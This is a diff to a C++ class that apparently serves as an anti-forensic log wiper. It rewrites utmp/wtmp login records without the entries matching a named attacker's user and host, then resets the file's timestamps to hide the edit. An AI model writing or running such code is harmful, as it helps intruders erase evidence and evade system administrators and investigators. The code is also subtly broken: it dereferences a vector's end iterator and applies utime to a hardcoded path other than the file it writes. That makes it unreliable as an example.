@@ -1,15 +1,27 @@
 #include "Utmp_Parse.h"
 
-UtmpParser::UtmpParser(std::string wtmp_file_path)
+UtmpParser::UtmpParser(std::string file_path)
 {
-	_file_path = wtmp_file_path;
+	_file_path = file_path;
+}
+
+UtmpParser::UtmpParser(std::string file_path, std::string attcker_name)
+	: UtmpParser(file_path)
+{
+	_attacker_name = attcker_name;
+}
+
+UtmpParser::UtmpParser(std::string file_path, std::string attcker_name, std::string attacker_address)
+	: UtmpParser(file_path, attcker_name)
+{
+	_attacker_address = attacker_address;
 }
 
 UtmpParser::~UtmpParser()
 {
-	for (int i = 0; i < _utmp_vector.size(); i++)
+	for (std::vector<utmp*>::iterator i = _utmp_vector.begin(); i != _utmp_vector.end(); i++)
 	{
-		delete _utmp_vector[i];
+		delete *i;
 	}
 	_utmp_vector.clear();
 }
@@ -36,22 +48,26 @@ std::vector<utmp*> UtmpParser::get_utmp_vector()
 
 UtmpParser& UtmpParser::set_attacker_name(std::string name)
 {
-	_attacker_address = name;
+	_attacker_name = name;
+	return *this;
 }
 
 UtmpParser& UtmpParser::set_attacker_address(std::string address)
 {
 	_attacker_address = address;
+	return *this;
 }
 
 UtmpParser& UtmpParser::set_utmp_file(std::string path)
 {
 	_file_path = path;
+	return *this;
 }
 
 UtmpParser& UtmpParser::set_utmp_vector(std::vector<utmp*> utmp_vector)
 {
 	_utmp_vector = utmp_vector;
+	return *this;
 }
 
 std::vector<utmp*> UtmpParser::get_content()
@@ -73,9 +89,8 @@ std::vector<utmp*> UtmpParser::get_content()
 UtmpParser& UtmpParser::modifier()
 {
 	_utmp_vector = get_content();
-	mode_t b = S_IRWXU | S_IRWXG;
-	FILE* utmp_file = fopen("/var/log/testing", "w");
-	int a = chmod("/vat/log/testing", 0664);
+	FILE* utmp_file = fopen(_file_path.c_str(), "w");
+	utimbuf *now = new utimbuf();
 	for (std::vector<utmp*>::iterator i = _utmp_vector.begin(); i != _utmp_vector.end(); i++)
 	{
 		if ((*i)->ut_user == _attacker_name && (*i)->ut_host == _attacker_address)
@@ -87,6 +102,11 @@ UtmpParser& UtmpParser::modifier()
 			fwrite((*i), sizeof(utmp), 1, utmp_file);
 		}
 	}
+	std::vector<utmp*>::iterator last = _utmp_vector.end();
+	now->actime = (*last)->ut_tv.tv_sec;
+	now->modtime = (*last)->ut_tv.tv_sec;
 	fclose(utmp_file);
+	utime("/var/log/testing", now);
+	delete(now);
 	return *this;
 }
